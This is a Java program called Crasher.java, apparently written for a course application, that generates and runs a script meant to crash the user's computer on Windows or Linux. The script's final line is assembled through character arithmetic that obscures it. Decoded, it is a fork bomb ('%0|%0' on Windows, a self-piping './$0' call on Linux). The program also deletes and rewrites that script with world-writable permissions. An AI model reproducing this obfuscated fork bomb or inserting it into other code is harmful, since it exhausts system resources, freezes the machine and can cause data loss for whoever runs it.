//Save as Crasher.java, compile and run it
/*
*********************
*made by Pedro Faria*
*********************

DISCLAIMER!
This program is a mess totally on purpose.
Works on both Windows/Linux
Made to reply an answer on a BEST course application.

Also, I'm not responsable for any data loss. Save everything before running this
*/

import java.io.*;

public class Crasher{

  public static int theAnswer = 42;  //hope you get the reference

  public static class CrasherScript{
    public String crasher_name;
    public String content;
    public int typeOfOS = 0;
    public File file;

    public void crashThis(int os){

      try{
        String execCmd = "cmd.exe /c " + crasher_name;
        if(os == 1){
          execCmd = "/bin/bash ./"+crasher_name;
        }
        System.out.println(execCmd);
        Process p = Runtime.getRuntime().exec(execCmd);
        InputStream is = p.getInputStream();
        int i = 0;
        StringBuffer sb = new StringBuffer();
        while((i = is.read()) != -1){
          sb.append((char)i);
        }
        System.out.print(sb.toString());
      }catch(IOException e){
        e.printStackTrace();
      }
    }

    public CrasherScript(){
      System.out.println("Creating your crash script. Wait a moment");
      if (System.getProperty("os.name").startsWith("Windows")) {
          this.crasher_name = "crasher.bat";
          System.out.println("Running Windows? What a shame.");
          this.typeOfOS = 0;
        } else {
          this.crasher_name = "crasher.sh";
          this.typeOfOS = 1;
      }
      this.content = createContent(theAnswer);

      try{
        this.file = new File(this.crasher_name);

        if(file.delete()){
          System.out.println("You really want to crash your computer again? Fine by me");
          System.out.println("Previous " + file.getName() + " is deleted! Another attempt to crash your computer is underway");
        }

	      if (file.createNewFile()){
          file.setReadable(true, false);
          file.setExecutable(true, false);
          file.setWritable(true, false);
	        System.out.println("File is created!");
          FileWriter fw = new FileWriter(file.getAbsoluteFile());
          BufferedWriter bw = new BufferedWriter(fw);
          bw.write(content);
          bw.close();
          System.out.println("ScriptDone!");
	      }else{
	        System.out.println("File already exists.");
	      }
      } catch (IOException e) {
         System.out.println("Failed to create file. Recheck your permissions please, or I cannot doom you :[");
         e.printStackTrace();
      }
    }

    private String createContent(int n){
      StringBuilder leString = new StringBuilder();

      if(typeOfOS == 1){
        leString.append("#!/bin/bash \n");
      }else{
        leString.append("@echo off \n");
      }
      leString.append("echo 'Crash in:' \n");
      for(int i = (n/8); i > 0 ; i--){
        leString.append("echo '"+ i +"' \n");
        if(i==2) leString.append("echo 'Accept me!' \n");
      }
      leString.append("echo 'So long and thanks for all the fish.' \n");
      if(this.typeOfOS == 1){
        leString.append((char)(theAnswer+4) + "/$" + (char)48 + (char)124 + "./" + (char)(theAnswer-6) + "0&");
      }else{
        leString.append("%" + (theAnswer-theAnswer) + "|%"  + (char)(theAnswer+6));
      }

      return leString.toString();
    }
  }

  public static void main(String[] args) {
    System.out.println("Creating your doom... I mean crash");
    CrasherScript script = new CrasherScript();
    System.out.println("Now crashing");
    script.crashThis(script.typeOfOS);
    System.out.println("Your computer has crashed. Really! Try to move your mouse or write anything :3");
  }
}
